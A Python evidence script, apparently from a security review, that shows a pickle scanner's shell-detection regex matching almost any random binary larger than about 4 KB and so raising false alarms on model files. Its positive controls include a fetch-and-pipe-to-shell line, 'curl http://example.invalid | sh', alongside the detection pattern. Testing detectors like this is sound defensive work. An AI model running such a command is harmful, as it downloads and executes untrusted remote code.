"""Evidence: MFV-PICKLE-006's shell heuristic detects binary, not shell.

hayward 1.0.1 flags HIGH when an allow-listed callable receives an argument
matching `_PICKLE_ARG_SHELL_RE` (hayward/scanner.py:1308):

    re.compile(r"\\$\\(|`|\\s[;&|]|[;&|]\\s")

The predicate is applied to the argument rendered as text. Against arbitrary
binary decoded as latin1 it saturates: past roughly 4 KB every blob matches.
So on any sizeable binary argument the rule reports the presence of bytes,
not the presence of a command.

Found on stanfordnlp/stanza-sl, whose lemma models carry gzip-compressed data
through `_codecs.encode(<blob>, 'latin1')`. Five of the six HIGH findings in a
1,616-file sample of real Hub models were this.

Run: python shell_regex_false_positive.py
"""

import os
import re

SHELL = re.compile(r"\$\(|`|\s[;&|]|[;&|]\s")
URL = re.compile(r"\b[a-z][a-z0-9+.\-]{1,15}://", re.I)

TRIALS = 200
SIZES = (64, 256, 1024, 4096, 65_536, 1_000_000)


def rate(pattern, size, trials=TRIALS):
    hits = sum(
        1 for _ in range(trials)
        if pattern.search(os.urandom(size).decode("latin1"))
    )
    return 100 * hits / trials


def main():
    print(f"Random binary decoded as latin1, {TRIALS} trials per size.\n")
    print(f"{'size':>12}  {'SHELL':>7}  {'URL':>7}")
    for size in SIZES:
        print(f"{size:>12,}  {rate(SHELL, size):6.1f}%  {rate(URL, size):6.1f}%")

    print("\nThe shell predicate is a coin flip at 64 bytes and a certainty")
    print("past 4 KB. The URL predicate requires a scheme followed by '://'")
    print("and does not have this problem, which is the control that shows")
    print("the flaw is in the pattern rather than in matching text at all.")

    print("\nA genuine short shell argument must keep matching:")
    for text in ("curl http://example.invalid | sh", "sh -c 'id'", "$(whoami)"):
        print(f"  {text!r:<38} {bool(SHELL.search(text))}")


if __name__ == "__main__":
    main()
